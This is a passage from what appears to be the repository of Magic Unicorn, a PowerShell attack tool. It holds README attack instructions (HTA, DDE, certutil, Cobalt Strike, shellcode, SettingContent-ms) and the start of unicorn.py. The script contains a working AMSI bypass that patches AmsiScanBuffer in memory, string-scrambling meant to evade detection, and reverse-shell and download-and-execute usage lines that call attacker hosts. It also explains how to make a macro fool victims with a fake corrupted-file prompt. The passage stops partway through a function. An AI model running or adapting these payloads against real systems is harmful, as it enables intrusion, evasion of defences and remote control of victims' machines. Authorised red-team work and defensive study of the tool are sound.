UNDER VARIABLE \"x\" OR A SYNTAX ERROR WILL\nHAPPEN!\n\n###                -----HTA ATTACK INSTRUCTIONS----\n\nThe HTA attack will automatically generate two files, the first the index.html which tells the browser to\nuse Launcher.hta which contains the malicious powershell injection code. All files are exported to the\nhta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the\nlast, the unicorn.rc file. You can run msfconsole -r unicorn.rc to launch the listener for  Metasploit.\n\nA user must click allow and accept when using the HTA attack in order for the powershell injection to work\nproperly.\n\n###                -----CERTUTIL Attack Instruction----\n\nThe certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take\na binary file, move it into a base64 format and use certutil on the victim machine to convert it back to\na binary for you. This should work on virtually any system and allow you to transfer a binary to the victim\nmachine through a fake certificate file. To use this attack, simply place an executable in the path of\nunicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,\ngo to decode_attack/ folder which contains the files. The bat file is a command that can be run in a\nwindows machine to convert it back to a binary.\n\n\n###                -----Custom PS1 Attack Instructions----\n\nThis attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.\n\nNote if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by\nVBA. You may change the number of characters in each VBA string by passing an integer as a parameter.\n\nExamples:\n\n    python unicorn.py harmless.ps1\n    python unicorn.py myfile.ps1 macro\n    python unicorn.py muahahaha.ps1 macro 500\n\nThe last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.\n\n\n\n\n###                -----DDE Office COM Attack Instructions----\n\nThis attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object \nDDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the\nability to gain remote code execution without the need of macros. This attack was documented and full\ninstructions can be found at:\n\nhttps://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nIn order to use this attack, run the following examples:\n\n    python unicorn.py <payload> <lhost> <lport> dde\n    python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde\n\nOnce generated, a powershell_attack.txt will be generated which contains the Office code, and the\nunicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to\nhandle the listener for the payload. In addition a download.ps1 will be exported as well (explained\nin the latter section).\n\nIn order to apply the payload, as an example (from sensepost article):\n\n1. Open Word\n2. Insert tab -> Quick Parts -> Field\n3. Choose = (Formula) and click ok.\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n5. Right-click the Field, choose \"Toggle Field Codes\"\n6. Paste in the code from Unicorn\n7. Save the Word document.\n\nOnce the office document is opened, you should receive a shell through powershell injection. Note\nthat DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.\n\nThe DDE attack will attempt to download download.ps1 which is our powershell injection attack since\nwe are limited to size restrictions. You will need to move the download.ps1 to a location that is\naccessible by the victim machine. This means that you need to host the download.ps1 in an Apache2\ndirectory that it has access to.\n\nYou may notice that some of the commands use \"{ QUOTE\" these are ways of masking specific commands\nwhich is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case\nwe are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL\nas it has some great methods for not calling DDE at all.\n\n###                -----Import Cobalt Strike Beacon----\n\nThis method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.\n\nWithin Cobalt Strike, export the Cobalt Strike \"CS\" (C#) export and save it to a file. For example, call \nthe file, cobalt_strike_file.cs. \n\nThe export code will look something like this:\n\n* length: 836 bytes */\nbyte[] buf = new byte[836] { 0xfc, etc\n\nNext, for usage:\n\n    python unicorn.py cobalt_strike_file.cs cs\n\nThe cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.\n\nNext simply copy the powershell command to something you have the ability for remote command execution.\n\nNOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.\n\nThere are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte\nsize. That means that from a command line argument perspective if you copy and paste you will hit the\n8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe\nthis is an issue, however if you are launching directly from PowerShell or other normal applications\nthis is a non-problem.\n\nA couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:\n\n    typedef struct _UNICODE_STRING {\n        USHORT Length;\n        USHORT MaximumLength;\n        PWSTR  Buffer;\n    } UNICODE_STRING;\n\nFor this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no\nissues.\n\n###                 -----Custom Shellcode Generation Method----\n\nThis method will allow you to insert your own shellcode into the Unicorn attack. The PowerShell code\nwill increase the stack side of the powershell.exe (through VirtualAlloc) and inject it into memory.\n\nNote that in order for this to work, your txt file that you point Unicorn to must be formatted in the \nfollowing format or it will not work:\n\n0x00,0x00,0x00 and so on.\n\nAlso note that there is size restrictions. The total length size of the PowerShell command cannot exceed\nthe size of 8191. This is the max command line argument size limit in Windows.\n\nUsage:\n\n    python unicorn.py shellcode_formatted_properly.txt shellcode\n\nNext simply copy the powershell command to something you have the ability for remote command execution.\n\nNOTE: THE FILE MUST PROPERLY BE FORMATTED IN A 0x00,0x00,0x00 TYPE FORMAT WITH NOTHING ELSE OTHER THAN\nYOUR SHELLCODE IN THE TXT FILE.\n\nThere are some caveats with this attack. Note that if your payload size is large in nature it will not\nfit in cmd.exe. That means that from a command line argument perspective if you copy and paste you will \nhit the 8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from \ncmd.exe this is an issue, however if you are launching directly from PowerShell or other normal \napplications this is a non-problem.\n\nA couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:\n\n    typedef struct _UNICODE_STRING {\n        USHORT Length;\n        USHORT MaximumLength;\n        PWSTR  Buffer;\n    } UNICODE_STRING;\n\nFor this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no  \nissues.\n\n###                 -----SettingContent-ms Extension Method----\n\n\nFirst, if you haven't had a chance, head over to the awesome SpectreOps blog from Matt Nelson (enigma0x3):\n\nhttps://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39\n\nThis method uses a specific file type called \".SettingContent-ms\" which allows for the ability for both\ndirect loads from browsers (open + command execution) as well as extension type through embedding in \noffice products. This one specifically will focus on extension type settings for command execution\nwithin Unicorn's PowerShell attack vector.\n\nThere are multiple methods supported with this attack vector. Since there is a limited character size\nwith this attack, the method for deployment is an HTA. \n\nFor a detailed understanding on weaponizing this attack visit:\n\nhttps://www.trustedsec.com/2018/06/weaponizing-settingcontent/\n\nThe steps you'll need to do to complete this attack is generate your .SettingContent-ms file from\neither a standalone or hta. The HTA method supports Metasploit, Cobalt Strike, and direct\nshellcode attacks.\n\nThe four methods below on usage: \n\nHTA SettingContent-ms Metasploit: `python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms`  \nHTA Example SettingContent-ms: `python unicorn.py <cobalt_strike_file.cs cs ms`  \nHTA Example SettingContent-ms: `python unicorn.py <path_to_shellcode.txt>: shellcode ms`  \nGenerate .SettingContent-ms: `python unicorn.py ms`\n\nThe first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth\njust a blank .SettingContent-ms file. \n\nWhen everything is generated, it will export a file called Standalone_NoASR.SettingContent-ms either in\nthe default root Unicorn directory (if using the standalone file generation) or under the hta_attack/\nfolder. You will need to edit the Standalone_NoASR.SettingContent-ms file and replace:\n\nREPLACECOOLSTUFFHERE\n\nWith:\n\nmshta http://<apache_server_ip_or_dns_name/Launcher.hta.\n\nThen move the contents of the hta_attack to /var/www/html.\n\nOnce the victim either clicks the .SettingContent-ms file, mshta will be called on the victim machine\nthen download the Unicorn HTA file which has the code execution capabilities. \n\nSpecial thanks and kudos to Matt Nelson for the awesome research\n\nAlso check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/\n\nUsage: \n\n    python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms\n    python unicorn.py <cobalt_strike_file.cs cs ms\n    python unicorn.py <patth_to_shellcode.txt>: shellcode ms\n    python unicorn.py ms\n\n"
        },
        {
          "name": "templates",
          "type": "tree",
          "content": null
        },
        {
          "name": "unicorn.py",
          "type": "blob",
          "size": 69.4931640625,
          "content": "#!/usr/bin/python3\n#\n# Magic Unicorn - PowerShell downgrade attack and exploitation tool\n#\n# Written by: Dave Kennedy (@HackingDave)\n# Company: TrustedSec (@TrustedSec) https://www.trustedsec.com\n#\n# Real quick down and dirty for native x86 powershell on any platform\n#\n# Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro>\n# Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443\n# Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro\n# HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta\n#\n# Requirements: Need to have Metasploit installed if using Metasploit methods.\n# Also supports Cobalt Strike and custom shellcode delivery methods.\n#\n#\n# IMPORTANT: The way this works is by using 32-bit shellcode and a 32-bit downgrade attack.\n# That means your payloads should be a 32-bit payload, not a 64-bit. It will not work if you\n# generate a 64-bit platform. Don't fret - the 32-bit payload works on the 64-bit platform.\n#\n# Special thanks to Matthew Graeber and Josh Kelley\n#\nimport base64\nimport re\nimport subprocess\nimport sys\nimport os\nimport shutil\nimport random\nimport string\nimport binascii\nfrom functools import reduce\n\n# python 3 compat\ntry: input = raw_input\nexcept NameError: pass\n\n#######################################################################################################\n# Keep Matt Happy #####################################################################################\n#######################################################################################################\n# ____  __.                        _____          __    __      ___ _                                ##\n#|    |/ _|____   ____ ______     /     \\ _____ _/  |__/  |_   /   |   \\_____  ______ ______ ___.__. ##\n#|      <_/ __ \\_/ __ \\\\____ \\   /  \\ /  \\\\__  \\\\   __\\   __\\ /    ~    \\__  \\ \\____ \\\\____ <   |  | ##\n#|    |  \\  ___/\\  ___/|  |_> > /    Y    \\/ __ \\|  |  |  |   \\    Y    // __ \\|  |_> >  |_> >___  | ##\n#|____|__ \\___  >\\___  >   __/  \\____|__  (____  /__|  |__|    \\___|_  /(____  /   __/|   __// ____| ##\n#        \\/   \\/     \\/|__|             \\/     \\/                    \\/      \\/|__|   |__|   \\/      ##\n#######################################################################################################\n#######################################################################################################\n\n\n##############################################################################################################\n#                                                                                                            #\n#                                                                                                            #\n# These are configuration options for Unicorn to automatically do certain things such as ASMI Bypassing.     #\n# More to come in this section soon, but you will want to configure this to turn it on/off depending         #\n# on what you need.                                                                                          #\n#                                                                                                            #\n##############################################################################################################\n\n\n# This will append the AMSI bypass code which is longer than 8191 characters. You will want to turn this off \n# if you need a payload that works with cmd.exe as it has a character length restriction size.\nAMSI_BYPASS=\"ON\"\n\n# This will print out the fully decoded command for you instead of running it through the powershell obfuscated\n# code.\nPRINT_DECODED=\"OFF\"\n\n#\n# generate a random string\n#\ndef generate_random_string(low, high):\n    length = random.randint(low, high)\n    letters = string.ascii_letters  # + string.digits\n    return ''.join([random.choice(letters) for _ in range(length)])\n\n\n# generate a random number based on range\ndef generate_random_number(low, high):\n    for x in range(1): return random.randint(low,high)\n\n# randomize words for evasion\ndef mangle_word(word):\n    random_length = generate_random_number(1, len(word))\n    counter = 0\n    assemble = \"\"\n    for letter in word:\n        if counter == random_length:\n            assemble = assemble + '\"+\"' + letter + '\"+\"' \n        else:\n            assemble = assemble + letter\n        counter = counter + 1 \n    return assemble\n\n# needed for color in unicorn eyes\nclass ColorsEnum:\n    CYAN = '\\033[96m'\n    BLUE = '\\033[94m'\n    RED = '\\033[91m'\n    BOLD = '\\033[1m'\n    ENDC = '\\033[0m'\n\n\n# display unicorn banner\ndef gen_unicorn():\n    print(r\"\"\"\n                                                         ,/\n                                                        //\n                                                      ,//\n                                          ___   /|   |//\n                                      `__/\\_ --(/|___/-/\n                                   \\|\\_-\\___ __-_`- /-/ \\.\n                                  |\\_-___,-\\_____--/_)' ) \\\n                                   \\ -_ /     __ \\( `( __`\\|\n                                   `\\__|      |\"\"\" + ColorsEnum.RED + r\"\"\"\\)\\ \"\"\" + ColorsEnum.ENDC + r\"\"\") \"\"\" + ColorsEnum.RED + r\"\"\"/(/\"\"\" + ColorsEnum.ENDC + r\"\"\"|\n           ,._____.,            ',--//-|      \\  |  '   /\n          /     __. \\,          / /,---|       \\       /\n         / /    _. \\  \\        `/`_/ _,'        |     |\n        |  | ( (  \\   |      ,/\\'__/'/          |     |\n        |  \\  \\`--, `_/_------______/           \\(   )/\n        | | \\  \\_. \\,                            \\___/\\\n        | |  \\_   \\  \\                                 \\\n        \\ \\    \\_ \\   \\   /                             \\\n         \\ \\  \\._  \\__ \\_|       |                       \\\n          \\ \\___  \\      \\       |                        \\\n           \\__ \\__ \\  \\_ |       \\                         |\n           |  \\_____ \\  ____      |                        |\n           | \\  \\__ ---' .__\\     |        |               |\n           \\  \\__ ---   /   )     |        \\              /\n            \\   \\____/ / ()(      \\          `---_       /|\n             \\__________/(,--__    \\_________.    |    ./ |\n               |     \\ \\  `---_\\--,           \\   \\_,./   |\n               |      \\  \\_ ` \\    /`---_______-\\   \\\\    /\n                \\      \\.___,`|   /              \\   \\\\   \\\n                 \\     |  \\_ \\|   \\              (   |:    |\n                  \\    \\      \\    |             /  / |    ;\n                   \\    \\      \\    \\          ( `_'   \\  |\n                    \\.   \\      \\.   \\          `__/   |  |\n                      \\   \\       \\.  \\                |  |\n                       \\   \\        \\  \\               (  )\n                        \\   |        \\  |              |  |\n                         |  \\         \\ \\              I  `\n                         ( __;        ( _;            ('-_';\n                         |___\\        \\___:            \\___:\n\n\naHR0cHM6Ly93d3cudHJ1c3RlZHNlYy5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMjAvMDUvc29ub2ZhLmpwZw==\n\n                \"\"\")\n\n\n# display amsi help\ndef amsi_help():\n    print(\"\"\"\n[*******************************************************************************************************]\n\n                                  -----AMSI BYPASS INFORMATION----\n\n\nFor a full writeup of this technique and how it works, visit the original research from these locations:\n\nhttps://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html\n\nhttps://www.cyberark.com/threat-research-blog/amsi-bypass-redux/\n\nThe way this works in Unicorn is by appending the bypass technique by disabling AMSI through patching and\ndisabling the AMSIScanBuffer functionality. In Unicorn this is an optional flag and can be turned off by\nediting the unicorn.py file and turning AMSI_BYPASS=\"ON\" to \"OFF\". The main trade-off with this technique\nis that although it turns off AMSI when it's going to scan, it also increases the length of the payload\nsubstantially. If you are working with cmd.exe as a method for a one liner powershell command, this will\nincrease the size of the payload more than the 8191 character size restriction. This means that when you\ngo to run this, you will need to do it directly through powershell.exe and not cmd.exe. \n\n[*******************************************************************************************************]\n\n    \"\"\")\n\n# display macro help\ndef macro_help():\n    print(\"\"\"\n[*******************************************************************************************************]\n\n\t\t\t\t-----MACRO ATTACK INSTRUCTIONS----\n\nFor the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do\nthat, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code\ninto that. This will automatically run. Note that a message will prompt to the user saying that the file\nis corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the\nvictim to thinking the excel document is corrupted. You should get a shell through powershell injection\nafter that.\n\n\"\"\" +  ColorsEnum.RED + \"\"\"If you are deploying this against Office365/2016+ versions of Word you need \nto modify the first line of the output from: Sub Auto_Open()\n \nTo: Sub AutoOpen()\n \nThe name of the macro itself must also be \"AutoOpen\" instead of the legacy \"Auto_Open\" naming scheme.\"\"\" + ColorsEnum.ENDC + \"\"\"\n\nNOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO\nREMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE \"x\" OR A SYNTAX ERROR WILL\nHAPPEN!\n\n[*******************************************************************************************************]\n\n\t\"\"\")\n\n\n# display hta help\ndef hta_help():\n    print(\"\"\"\n[*******************************************************************************************************]\n\n\t\t\t\t-----HTA ATTACK INSTRUCTIONS----\n\nThe HTA attack will automatically generate two files, the first the index.html which tells the browser to\nuse Launcher.hta which contains the malicious powershell injection code. All files are exported to the\nhta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the\nlast, the unicorn.rc (if metasploit was used) file. You can run msfconsole -r unicorn.rc to launch the listener \nfor Metasploit. If you didn't use Metasploit, only two files will be exported.\n\nA user must click allow and accept when using the HTA attack in order for the powershell injection to work\nproperly.\n\n[*******************************************************************************************************]\n\n\t\"\"\")\n\n# display powershell help\ndef ps_help():\n    print(\"\"\"\n[********************************************************************************************************]\n\n\t\t\t\t-----POWERSHELL ATTACK INSTRUCTIONS----\n\nEverything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.\n\nNote that you will need to have a listener enabled in order to capture the attack.\n\n[*******************************************************************************************************]\n\t\"\"\")\n\n# display cert help\ndef cert_help():\n    print(\"\"\"\n[*******************************************************************************************************]\n\n\t\t\t\t-----CERTUTIL Attack Instruction----\n\nThe certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take\na binary file, move it into a base64 format and use certutil on the victim machine to convert it back to\na binary for you. This should work on virtually any system and allow you to transfer a binary to the victim\nmachine through a fake certificate file. To use this attack, simply place an executable in the path of\nunicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,\ngo to decode_attack/ folder which contains the files. The bat file is a command that can be run in a\nwindows machine to convert it back to a binary.\n\n[*******************************************************************************************************]\n\t\"\"\")\n\n# display dde office injection help\ndef dde_help():\n    print(\"\"\"\n\n[*******************************************************************************************************]\n\n                -----DDE Office COM Attack Instructions----\n\nThis attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object \nDDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the\nability to gain remote code execution without the need of macros. This attack was documented and full\ninstructions can be found at:\n\nhttps://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nIn order to use this attack, run the following examples:\n\npython unicorn.py <payload> <lhost> <lport> dde\npython unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde\n\nOnce generated, a powershell_attack.txt will be generated which contains the Office code, and the\nunicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to\nhandle the listener for the payload. In addition a download.ps1 will be exported as well (explained\nin the latter section).\n\nIn order to apply the payload, as an example (from sensepost article):\n\n1. Open Word\n2. Insert tab -> Quick Parts -> Field\n3. Choose = (Formula) and click ok.\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n5. Right-click the Field, choose \"Toggle Field Codes\"\n6. Paste in the code from Unicorn\n7. Save the Word document.\n\nOnce the office document is opened, you should receive a shell through powershell injection. Note\nthat DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.\n\nThe DDE attack will attempt to download download.ps1 which is our powershell injection attack since\nwe are limited to size restrictions. You will need to move the download.ps1 to a location that is\naccessible by the victim machine. This means that you need to host the download.ps1 in an Apache2\ndirectory that it has access to.\n\nYou may notice that some of the commands use \"{ QUOTE\" these are ways of masking specific commands\nwhich is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case\nwe are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL\nas it has some great methods for not calling DDE at all.\n\n[*******************************************************************************************************]\n    \"\"\")\n\ndef custom_ps1_help():\n    print(\"\"\"\n[*******************************************************************************************************]\n\n\t\t\t\t-----Custom PS1 Attack Instructions----\n\nThis attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.\n\nNote if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by\nVBA. You may change the number of characters in each VBA string by passing an integer as a parameter.\n\nExamples:\n\npython unicorn.py harmless.ps1\npython unicorn.py myfile.ps1 macro\npython unicorn.py muahahaha.ps1 macro 500\n\nThe last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.\n\n[*******************************************************************************************************]\n\t\"\"\")\n\n\n# cobalt strike usage banner\ndef cobalt_strike():\n    print(\"\"\"\n[*******************************************************************************************************]\n\n                -----Import Cobalt Strike Beacon----\n\nThis method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.\n\nWithin Cobalt Strike, export the Cobalt Strike \"CS\" (C#) export and save it to a file. For example, call \nthe file, cobalt_strike_file.cs. \n\nThe export code will look something like this:\n\n* length: 836 bytes */\nbyte[] buf = new byte[836] { 0xfc, etc\n\nNext, for usage:\n\npython unicorn.py cobalt_strike_file.cs cs\n\nThe cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.\n\nNext simply copy the powershell command to something you have the ability for remote command execution.\n\nNOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.\n\nThere are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte\nsize. That means that from a command line argument perspective if you copy and paste you will hit the\n8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe\nthis is an issue, however if you are launching directly from PowerShell or other normal applications\nthis is a non-problem.\n\nA couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:\n\ntypedef struct _UNICODE_STRING {\n    USHORT Length;\n    USHORT MaximumLength;\n    PWSTR  Buffer;\n} UNICODE_STRING;\n\nFor this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no\nissues.\n\n[*******************************************************************************************************]\n    \"\"\")\n\n# this is used for custom shellcode generation\ndef custom_shellcode():\n    print(\"\"\"\n[*******************************************************************************************************]\n\n                -----Custom Shellcode Generation Method----\n\nThis method will allow you to insert your own shellcode into the Unicorn attack. The PowerShell code\nwill increase the stack side of the powershell.exe (through VirtualAlloc) and inject it into memory.\n\nNote that in order for this to work, your txt file that you point Unicorn to must be formatted in the \nfollowing format or it will not work:\n\n0x00,0x00,0x00 and so on.\n\nAlso note that there is size restrictions. The total length size of the PowerShell command cannot exceed\nthe size of 8191. This is the max command line argument size limit in Windows.\n\nUsage:\n\npython unicorn.py shellcode_formatted_properly.txt shellcode\n\nNext simply copy the powershell command to something you have the ability for remote command execution.\n\nNOTE: THE FILE MUST PROPERLY BE FORMATTED IN A 0x00,0x00,0x00 TYPE FORMAT WITH NOTHING ELSE OTHER THAN\nYOUR SHELLCODE IN THE TXT FILE.\n\nThere are some caveats with this attack. Note that if your payload size is large in nature it will not\nfit in cmd.exe. That means that from a command line argument perspective if you copy and paste you will \nhit the 8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from \ncmd.exe this is an issue, however if you are launching directly from PowerShell or other normal \napplications this is a non-problem.\n\nA couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:\n\ntypedef struct _UNICODE_STRING {\n    USHORT Length;\n    USHORT MaximumLength;\n    PWSTR  Buffer;\n} UNICODE_STRING;\n\nFor this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no  \nissues.\n\n\n[*******************************************************************************************************]\n    \"\"\")\n\n# this is used for custom shellcode generation\ndef settings_ms():\n    print(\"\"\"\n[*******************************************************************************************************]\n\n                -----SettingContent-ms Extension Method----\n\nFirst, if you haven't had a chance, head over to the awesome SpectreOps blog from Matt Nelson (enigma0x3):\n\nhttps://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39\n\nThis method uses a specific file type called \".SettingContent-ms\" which allows for the ability for both\ndirect loads from browsers (open + command execution) as well as extension type through embedding in \noffice products. This one specifically will focus on extension type settings for command execution\nwithin Unicorn's PowerShell attack vector.\n\nThere are multiple methods supported with this attack vector. Since there is a limited character size\nwith this attack, the method for deployment is an HTA. \n\nFor a detailed understanding on weaponizing this attack visit:\n\nhttps://www.trustedsec.com/2018/06/weaponizing-settingcontent/\n\nThe steps you'll need to do to complete this attack is generate your .SettingContent-ms file from\neither a standalone or hta. The HTA method supports Metasploit, Cobalt Strike, and direct\nshellcode attacks.\n\nThe four methods below on usage: \n\nHTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms\nHTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms\nHTA Example SettingContent-ms: python unicorn.py <path_to_shellcode.txt>: shellcode ms\nGenerate .SettingContent-ms: python unicorn.py ms\n\nThe first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth\njust a blank .SettingContent-ms file. \n\nWhen everything is generated, it will export a file called Standalone_NoASR.SettingContent-ms either in\nthe default root Unicorn directory (if using the standalone file generation) or under the hta_attack/\nfolder. You will need to edit the Standalone_NoASR.SettingContent-ms file and replace:\n\nREPLACECOOLSTUFFHERE\n\nWith:\n\nmshta http://<apache_server_ip_or_dns_name/Launcher.hta.\n\nThen move the contents of the hta_attack to /var/www/html.\n\nOnce the victim either clicks the .SettingContent-ms file, mshta will be called on the victim machine\nthen download the Unicorn HTA file which has the code execution capabilites. \n\nSpecial thanks and kudos to Matt Nelson for the awesome research\n\nAlso check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/\n\nUsage: \n\npython unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms\npython unicorn.py <cobalt_strike_file.cs cs ms\npython unicorn.py <path_to_shellcode.txt>: shellcode ms\npython unicorn.py ms\n\n\"\"\")\n\n# usage banner\ndef gen_usage():\n    print(\"-------------------- Magic Unicorn Attack Vector v3.17 -----------------------------\")\n    print(\"\\nNative x86 powershell injection attacks on any Windows platform.\")\n    print(\"Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)\")\n    print(\"Twitter: @TrustedSec, @HackingDave\")\n    print(\"Credits: Matthew Graeber, Justin Elze, Chris Gates\")\n    print(\"\\nHappy Magic Unicorns.\")\n    print(\"\")\n    print(\"Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>\")\n    print(\"PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443\")\n    print(\"PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe\")\n    print(\"PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro\")\n    print(\"Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro\")\n    print(\"Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro\")\n    print(\"HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta\")\n    print(\"HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms\")\n    print(\"HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta\")\n    print(\"HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms\")\n    print(\"HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms\")\n    print(\"DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde\")\n    print(\"CRT Example: python unicorn.py <path_to_payload/exe_encode> crt\")\n    print(\"Custom PS1 Example: python unicorn.py <path to ps1 file>\")\n    print(\"Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500\")\n    print(\"Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)\")\n    print(\"Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00 or metasploit)\")\n    print(\"Custom Shellcode HTA: python unicorn.py <path_to_shellcode.txt> shellcode hta (formatted 0x00 or metasploit)\")\n    print(\"Custom Shellcode Macro: python unicorn.py <path_to_shellcode.txt> shellcode macro (formatted 0x00 or metasploit)\")\n    print(\"Generate .SettingContent-ms: python unicorn.py ms\")\n    print(\"Help Menu: python unicorn.py --help\\n\")\n\n# Using Rasta Mouse AMSI Bypass: https://raw.githubusercontent.com/rasta-mouse/AmsiScanBufferBypass/master/ASBBypass.ps1\ndef bypass_amsi():\n    amsi_string = (\"\"\"$1111 = @\"\\nusing System;using System.Runtime.InteropServices;public class Win32 {[DllImport(\"$kernel32\")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport(\"$kernel32\")] public static extern IntPtr LoadLibrary(string name);[DllImport(\"$kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}\\n\"@\\nAdd-Type $1111;$2222 = [Win32]::GetProcAddress([Win32]::LoadLibrary(\"$amsi$dll\"), \"$amsi$scan$buffer\");$3333 = 0;[Win32]::VirtualProtect($2222, [uint32][uint32]5, 0x40, [ref]$3333);$4444 = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);[System.Runtime.InteropServices.Marshal]::Copy($4444, 0, $2222, 6)\"\"\")\n    return amsi_string\n\n# this will convert any url to hexformat for download/exec payload\ndef url_hexified(url):\n    x = binascii.hexlify(url)\n    x = x.decode('utf-8')\n    a = [x[i:i+2] for i in range(0, len(x), 2)]\n    list = \"\"\n    for goat in a: list = list + \"\\\\x\" + goat.rstrip()\n    return list\n\n# split string\ndef split_str(s, length):\n    return [s[i:i + length] for i in range(0, len(s), length)]\n\n# write a file to designated path\ndef write_file(path, text):\n    file_write = open(path, \"w\")\n    file_write.write(text)\n    file_write.close()\n\n\n# scramble commmands into multiple strings\ndef scramble_stuff():\n    ps = \"powershell.exe\"\n    list = \"\"\n    for letter in ps:\n        